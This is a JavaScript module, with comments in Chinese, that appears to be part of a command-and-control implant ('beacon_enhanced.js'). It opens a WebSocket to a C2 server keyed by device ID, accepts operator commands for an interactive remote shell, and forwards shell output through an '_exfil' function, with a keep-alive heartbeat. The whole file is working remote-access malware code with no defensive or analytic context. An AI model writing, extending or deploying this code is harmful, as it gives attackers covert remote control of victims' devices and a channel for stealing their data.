/**
 * shell_client.js — 客户端交互式 Shell
 * 
 * 用途：连接到服务端 WebSocket，提供交互式终端
 * 
 * 集成到 beacon_enhanced.js 中作为新命令
 */

(function() {
  'use strict';

  let shellWs = null;
  let shellBuffer = [];
  const MAX_BUFFER = 10000; // 最大缓冲行数

  /**
   * 启动交互式 Shell
   */
  globalThis.startInteractiveShell = function(c2Url) {
    if (shellWs && shellWs.readyState !== WebSocket.CLOSED) {
      return { status: 'error', message: 'Shell already running' };
    }

    const deviceId = getDeviceId();
    const wsUrl = c2Url.replace(/^http/, 'ws') + '/ws/shell/' + deviceId;

    return new Promise((resolve, reject) => {
      shellWs = new WebSocket(wsUrl);
      shellBuffer = [];

      shellWs.onopen = () => {
        resolve({ status: 'connected', message: 'Interactive shell started' });
      };

      shellWs.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          
          switch (msg.type) {
            case 'welcome':
              shellBuffer.push(msg.message);
              break;
              
            case 'output':
              // 解码 base64 输出
              const output = atob(msg.data);
              shellBuffer.push(output);
              
              // 限制缓冲区大小
              if (shellBuffer.length > MAX_BUFFER) {
                shellBuffer = shellBuffer.slice(-MAX_BUFFER);
              }
              
              // 回传到服务端（用于 Web UI 显示）
              _exfil('shell_output', { 
                deviceId, 
                output: output.substring(0, 1000), // 限制单次传输大小
                timestamp: Date.now() 
              });
              break;
              
            case 'exit':
              shellBuffer.push(`\n[Shell exited: code=${msg.exitCode}]\n`);
              shellWs.close();
              break;
              
            case 'pong':
              // 心跳响应
              break;
          }
        } catch (e) {
          console.error('[Shell] Message parse error:', e);
        }
      };

      shellWs.onerror = (error) => {
        reject({ status: 'error', message: 'WebSocket error', error });
      };

      shellWs.onclose = () => {
        shellBuffer.push('\n[Shell disconnected]\n');
        shellWs = null;
      };
    });
  };

  /**
   * 发送命令到 Shell
   */
  globalThis.shellExec = function(command) {
    if (!shellWs || shellWs.readyState !== WebSocket.OPEN) {
      return { status: 'error', message: 'Shell not connected' };
    }

    try {
      const input = command + '\n';
      shellWs.send(JSON.stringify({
        type: 'input',
        data: btoa(input)
      }));
      return { status: 'sent', command };
    } catch (e) {
      return { status: 'error', message: e.message };
    }
  };

  /**
   * 获取 Shell 输出缓冲
   */
  globalThis.shellGetBuffer = function(lines) {
    lines = lines || 50;
    return shellBuffer.slice(-lines).join('');
  };

  /**
   * 关闭 Shell
   */
  globalThis.shellClose = function() {
    if (shellWs) {
      shellWs.close();
      shellWs = null;
      return { status: 'closed' };
    }
    return { status: 'not_running' };
  };

  /**
   * 调整终端尺寸
   */
  globalThis.shellResize = function(cols, rows) {
    if (!shellWs || shellWs.readyState !== WebSocket.OPEN) {
      return { status: 'error', message: 'Shell not connected' };
    }

    shellWs.send(JSON.stringify({
      type: 'resize',
      cols: parseInt(cols) || 80,
      rows: parseInt(rows) || 24
    }));
    return { status: 'resized', cols, rows };
  };

  // 心跳保持连接
  setInterval(() => {
    if (shellWs && shellWs.readyState === WebSocket.OPEN) {
      shellWs.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000); // 每30秒

})();